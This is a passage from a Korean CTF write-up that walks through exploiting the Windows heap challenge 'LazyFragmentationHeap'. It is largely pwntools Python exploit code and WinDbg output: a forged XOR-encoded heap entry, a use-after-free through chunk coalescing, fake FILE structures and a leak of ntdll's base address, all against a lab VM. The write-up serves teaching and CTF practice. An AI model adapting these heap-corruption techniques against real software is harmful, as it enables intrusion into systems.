0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fake XOR'ed _HEAP_ENTRY = 0x%016x"</span> <span class="o">%</span> <span class="n">fake_entry</span><span class="p">)</span>

<span class="n">open_file</span><span class="p">()</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
0:001&gt; dqs beefdad0000 lf
00000bee`fdad0000  0000ddaa`beef1acd
00000bee`fdad0008  00000000`000000c8
00000bee`fdad0010  00000000`00000001
00000bee`fdad0018  face6da6`1a35c767
00000bee`fdad0020  00000165`a3ed4370

00000bee`fdad0028  0000ddaa`beef1acd
00000bee`fdad0030  00000000`00000268
00000bee`fdad0038  00000000`00000002
00000bee`fdad0040  face6da6`1a35c767
00000bee`fdad0048  00000165`a3edff40

00000bee`fdad0050  0000ddaa`beef1acd
00000bee`fdad0058  00000000`00000200
00000bee`fdad0060  00000000`00000003
00000bee`fdad0068  0000ddaa`beef1acd
00000bee`fdad0070  00000165`a3ee01b0

0:001&gt; !heap -p -a 00000165`a3ee01b0
    address 00000165a3ee01b0 found in
    _HEAP @ 165a3ed0000
              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
        00000165a3ee01a0 01c8 0000  [00]   00000165a3ee01b0    01c70 - (busy)
'''</span>
</code></pre></div></div> <p>이제 이 취약점을 어떻게 사용할 수 있을지 고민해봐야 합니다.</p> <p>지금까지 찾아낸 OOB 취약점을 이용해서는 Heap chunk만 조작할 수 있기 때문에, <a href="#310-allocate-and-free-non-lfh-chunk">3.10. Allocate and Free Non-LFH chunk</a>에서 설명한 것처럼 Non-LFH chunk의 경우 할당해제시 인접한 Heap chunk를 탐색하며 병합( coalesce )처리한다는 원리를 이용해볼 수 있습니다.</p> <p>그렇기 때문에 OOB write로 조작한 size의 범위안에 다른 Heap chunk가 있다면 그 chunk도 같이 할당해제되서 UAF가 발생해 아래처럼 Heap 주소를 leak할 수 있습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>

<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
<span class="s">'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x008 SubSegmentCode   : 0xc80101c8
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fake XOR'ed _HEAP_ENTRY = 0x%016x"</span> <span class="o">%</span> <span class="n">fake_entry</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>		 <span class="mh">0x200</span>     <span class="c1"># original size of overwritten chunk
</span><span class="p">)</span> 

<span class="n">open_file</span><span class="p">()</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
<span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaked heap addr = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_leak</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000d60f1a72815a
[*] fake XOR'ed _HEAP_ENTRY = 0x1000d628d2738092
[*] leaked heap addr = 0x000002478ae70150
[*] Paused (press any to continue)
....
0:001&gt; dqs beefdad0000 l14
....
00000bee`fdad0078  0000ddaa`beef1acd
00000bee`fdad0080  00000000`00001a60
00000bee`fdad0088  00000000`00000004
00000bee`fdad0090  0000ddaa`beef1acd
00000bee`fdad0098  00000247`8ae803c0
0:001&gt; dqs 247`8ae803c0 l2
00000247`8ae803c0  00000247`8ae70150
00000247`8ae803c8  00000247`8ae82e40
0:001&gt; !heap
        Heap Address      NT/Segment Heap

         2478ae70000              NT Heap
         2478ac10000              NT Heap
         2478b0a0000              NT Heap
'''</span>
</code></pre></div></div> <p>leak된 heap 주소의 offset이 항상 0x150( <strong>_HEAP-&gt;FreeLists</strong> )으로 고정되어 있기 때문에 Heap chunk들을 관리하는 <strong>_HEAP</strong> 구조체의 주소를 안정적으로 구할 수 있습니다.</p> <p>분석하다 알게된 신기한 사실 중 하나는 <code class="language-plaintext highlighter-rouge">5. LazyFileHandler</code>에서 <code class="language-plaintext highlighter-rouge">1. ReadFile</code>로 <strong>magic.txt</strong>에 대한 FILE 구조체를 생성하면 해당 구조체가 LFH가 활성화된 Heap 영역에 할당된다는 점입니다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:001&gt; dqs lazyfragmentationheap+5628 l1
00007ff6`521f5628  000001b7`d069a8b0

0:001&gt; !heap -i 000001b7`d069a8b0-10
Detailed information for block entry 000001b7d069a8a0
Assumed heap       : 0x000001b7d0690000 (Use !heap -i NewHeapHandle to change)
Header content     : 0xE76D0D32 0x88000D43
Block flags        : 0x1 LFH (busy )
Total block size   : 0x6 units (0x60 bytes)
Requested size     : 0x58 bytes (unused 0x8 bytes)
Subsegment         : 0x000001b7d069bb90
</code></pre></div></div> <p>LFH는 <strong>_HEAP_SUBSEGMENT-&gt;BlockCount</strong>보다 많은 개수의 Heap chunk를 생성하게 되면 새로운 UserBlock과 SubSegment를 할당해 사용합니다. 이러한 원리를 이용해 LFH가 UAF로 접근할 수 있는 chunk 4를 사용하게 만든다면 아래와 같이 FILE 구조체를 조작할 수 있습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
	<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
	<span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>

<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
<span class="s">'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x008 SubSegmentCode   : 0xc80101c8
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fake XOR'ed _HEAP_ENTRY = 0x%016x"</span> <span class="o">%</span> <span class="n">fake_entry</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>         <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span><span class="p">)</span> 

<span class="n">open_file</span><span class="p">()</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
<span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
	<span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;_HEAP = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_base</span><span class="p">)</span>

<span class="c1"># make LFH to allocate new Userblock in chunk 4
</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
	<span class="n">open_file</span><span class="p">()</span>

<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
0:001&gt; dqs beefdad0000+(0x28*3) l5
00000bee`fdad0078  0000ddaa`beef1acd
00000bee`fdad0080  00000000`00001a60 &lt;------------|
00000bee`fdad0088  00000000`00000004              |
00000bee`fdad0090  0000ddaa`beef1acd              |
00000bee`fdad0098  00000128`446003c0              |---- profit!
0:001&gt; dqs lazyfragmentationheap+5628 l1          |
00007ff7`6f405628  00000128`44600950              |
0:001&gt; ? 00000128`44600950-00000128`446003c0      |
Evaluate expression: 1424 = 00000000`00000590 &lt;---|
'''</span>
</code></pre></div></div> <p>FILE 구조체를 이용한 공격기법은 Angelboy가 작성한 <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with FILE Structure - Yet Another Binary Exploit Technique</a>에 잘 정리되어 있지만 Linux를 기준으로 설명하고 있어 Windows의 FILE 구조체와는 약간 다른데 이 부분은 디버거로 보면 바로 보이기 때문에 FILE 구조체가 어떤 구조를 가지고 있는지 분석하는 건 그닥 어렵지 않습니다.</p> <p><strong>_HEAP</strong> 구조체의 주소를 알고 있으니 해당 구조체 근처에서 구할 수 있는 <strong>ntdll.dll</strong>의 주소부터 leak해보겠습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="c1"># make LFH to allocate new Userblock in chunk 4
</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
	<span class="n">open_file</span><span class="p">()</span>

<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
<span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2C0</span><span class="p">)</span>  <span class="c1"># cursor of SEEK_CUR, _HEAP-&gt;LockVariable-&gt;Lock
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>          <span class="c1"># base address, &amp;_HEAP
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>				
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
<span class="n">ntdll_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x163d70</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;ntdll = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll_base</span><span class="p">)</span>

<span class="n">pause</span><span class="p">()</span>
<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="s">'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000b6942c981917
[*] fake XOR'ed _HEAP_ENTRY = 0x1000b6b3e49918df
[*] &amp;_HEAP = 0x0000018809710000
[*] &amp;ntdll = 0x00007ffd09b00000
[*] Paused (press any to continue)
....
0:001&gt; ? ntdll
Evaluate expression: 140724765982720 = 00007ffd`09b00000
'''</span>
</code></pre></div></div> <p>그리고 주소를 계속 leak해보다가 알게된 건데 정확한 이유는 알 수 없지만 프로세스가 바뀌더라도 <strong>LazyFragmentationHeap.exe</strong>를 포함해 로드된 모듈들의 주소는 변하지 않았습니다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000ded8a1942b54
[*] fake XOR'ed _HEAP_ENTRY = 0x1000deff69952a9c
[*] &amp;_HEAP = 0x000001c50e7e0000
[*] &amp;ntdll = 0x00007ffd09b00000 &lt;------------------------------|
[*] Closed connection to 192.168.0.18 port 6677                |
                                                               |
$ python ex.py                                                 |
[+] Opening connection to 192.168.0.18 on port 6677: Done      |
[*] _HEAP-&gt;Encoding = 0x000072da0f33e8bf                       |
[*] fake XOR'ed _HEAP_ENTRY = 0x100072fdc732e977               |
[*] &amp;_HEAP = 0x0000019898950000                                |
[*] &amp;ntdll = 0x00007ffd09b00000 &lt;------------------------------|
</code></pre></div></div> <p>어차피 FILE 구조체를 통해 데이터를 읽어들이는 횟수에 제한을 두고 있어서, FILE 구조체를 이용한 주소 leak은 프로세스 당 한번씩만 할 수 있기 때문에 아래와 같이 코드를 수정했습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span> <span class="c1"># yes, I intend korean slang
</span>
<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
	<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
	<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

	<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
	<span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
		<span class="k">return</span>

	<span class="c1"># log.info("_HEAP-&gt;Encoding = 0x%016x" % heap_encod)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
	<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
	<span class="s">'''
	0x10000027c80101c8
	   +0x008 Size             : 0x1c8
	   +0x00a Flags            : 0x1 ''
	   +0x00b SmallTagIndex    : 0xc8 ''
	   +0x008 SubSegmentCode   : 0xc80101c8
	   +0x00c PreviousSize     : 0x27
	   +0x00e SegmentOffset    : 0 ''
	   +0x00e LFHFlags         : 0 ''
	   +0x00f UnusedBytes      : 0x10 ''
	'''</span>

	<span class="c1"># log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>	         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
